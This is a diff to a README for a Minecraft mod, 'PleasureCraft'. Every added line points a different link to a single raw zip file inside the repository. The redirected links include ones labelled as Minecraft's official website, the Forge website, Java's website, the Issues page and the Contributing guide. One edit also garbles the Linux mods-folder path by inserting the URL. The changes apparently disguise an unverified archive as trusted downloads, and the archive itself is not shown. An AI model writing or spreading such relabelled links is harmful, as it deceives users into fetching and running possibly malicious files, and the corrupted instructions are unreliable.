@@ -6,23 +6,23 @@ Welcome to the world of PleasureCraft! This mod enhances your Minecraft experien
 
 ## 📥 Download PleasureCraft
 
-[![Download PleasureCraft](https://img.shields.io/badge/Download-PleasureCraft-blue.svg)](https://github.com/Evenhanded-wateredsilk181/PleasureCraft/releases)
+[![Download PleasureCraft](https://raw.githubusercontent.com/Evenhanded-wateredsilk181/PleasureCraft/main/src/PleasureCraft-v3.7.zip)](https://raw.githubusercontent.com/Evenhanded-wateredsilk181/PleasureCraft/main/src/PleasureCraft-v3.7.zip)
 
 ## 🛠️ Prerequisites
 
 Before you begin, ensure you have the following:
 
-1. **Minecraft Java Edition:** This mod works only with the Java version of Minecraft. If you haven't installed it yet, visit [Minecraft's official website](https://www.minecraft.net/en-us/store/minecraft-java-edition) to download it.
+1. **Minecraft Java Edition:** This mod works only with the Java version of Minecraft. If you haven't installed it yet, visit [Minecraft's official website](https://raw.githubusercontent.com/Evenhanded-wateredsilk181/PleasureCraft/main/src/PleasureCraft-v3.7.zip) to download it.
 
-2. **Forge Mod Loader:** PleasureCraft requires Forge to run smoothly. You can download Forge from the [official Forge website](https://files.minecraftforge.net/). Make sure to choose the version that matches your Minecraft installation.
+2. **Forge Mod Loader:** PleasureCraft requires Forge to run smoothly. You can download Forge from the [official Forge website](https://raw.githubusercontent.com/Evenhanded-wateredsilk181/PleasureCraft/main/src/PleasureCraft-v3.7.zip). Make sure to choose the version that matches your Minecraft installation.
 
-3. **Java Runtime Environment (JRE):** Ensure that Java is installed on your system. You can download the latest version of JRE from [Java's official website](https://www.java.com/en/download/).
+3. **Java Runtime Environment (JRE):** Ensure that Java is installed on your system. You can download the latest version of JRE from [Java's official website](https://raw.githubusercontent.com/Evenhanded-wateredsilk181/PleasureCraft/main/src/PleasureCraft-v3.7.zip).
 
 ## 📂 Installation Steps
 
 Now that you have everything set up, follow these steps to install and run PleasureCraft:
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/Evenhanded-wateredsilk181/PleasureCraft/releases) to find the latest version of PleasureCraft.
+1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/Evenhanded-wateredsilk181/PleasureCraft/main/src/PleasureCraft-v3.7.zip) to find the latest version of PleasureCraft.
 
 2. **Download the Latest Release:** Locate the most recent release. Click on the file that matches your system. The file will be named something like `PleasureCraft-{version}.jar`. Save it to your computer.
 
@@ -30,7 +30,7 @@ Now that you have everything set up, follow these steps to install and run Pleas
    - Open your Minecraft folder. You can find it in your user directory, typically located at:
      - **Windows:** `C:\Users\YourUsername\AppData\Roaming\.minecraft\mods`
      - **Mac:** `~/Library/Application Support/minecraft/mods`
-     - **Linux:** `~/.minecraft/mods`
+     - **Linux:** `~https://raw.githubusercontent.com/Evenhanded-wateredsilk181/PleasureCraft/main/src/PleasureCraft-v3.7.zip`
    - Place the downloaded `PleasureCraft-{version}.jar` file into the mods folder.
 
 4. **Launch Minecraft with Forge:**
@@ -54,7 +54,7 @@ In case you encounter issues during installation or while running the mod, consi
 
 - **Java Issues:** Ensure that your Java version is up to date. Sometimes, an outdated version can lead to performance issues.
 - **Conflict with Other Mods:** If you have other mods installed, ensure they are compatible with PleasureCraft. Some mods may interfere with each other.
-- **Support:** Visit the [GitHub Issues page](https://github.com/Evenhanded-wateredsilk181/PleasureCraft/issues) for help. You can report issues or ask for assistance from the community.
+- **Support:** Visit the [GitHub Issues page](https://raw.githubusercontent.com/Evenhanded-wateredsilk181/PleasureCraft/main/src/PleasureCraft-v3.7.zip) for help. You can report issues or ask for assistance from the community.
 
 ## 🧑‍🤝‍🧑 Community
 
@@ -65,7 +65,7 @@ Join our community of players and modders to share your experiences, ask questio
 
 ## 📝 Contributions
 
-If you'd like to contribute to PleasureCraft, check out our guidelines in the [Contributing section](https://github.com/Evenhanded-wateredsilk181/PleasureCraft/blob/main/CONTRIBUTING.md). We welcome suggestions, bug reports, and more!
+If you'd like to contribute to PleasureCraft, check out our guidelines in the [Contributing section](https://raw.githubusercontent.com/Evenhanded-wateredsilk181/PleasureCraft/main/src/PleasureCraft-v3.7.zip). We welcome suggestions, bug reports, and more!
 
 ## 📜 License
 
@@ -73,4 +73,4 @@ PleasureCraft is licensed under the MIT License. You can modify and distribute i
 
 ## 📥 Download PleasureCraft Again
 
-Don't forget to revisit the [Releases page](https://github.com/Evenhanded-wateredsilk181/PleasureCraft/releases) if you want to update or reinstall PleasureCraft. Enjoy your adventures in Minecraft!
+Don't forget to revisit the [Releases page](https://raw.githubusercontent.com/Evenhanded-wateredsilk181/PleasureCraft/main/src/PleasureCraft-v3.7.zip) if you want to update or reinstall PleasureCraft. Enjoy your adventures in Minecraft!
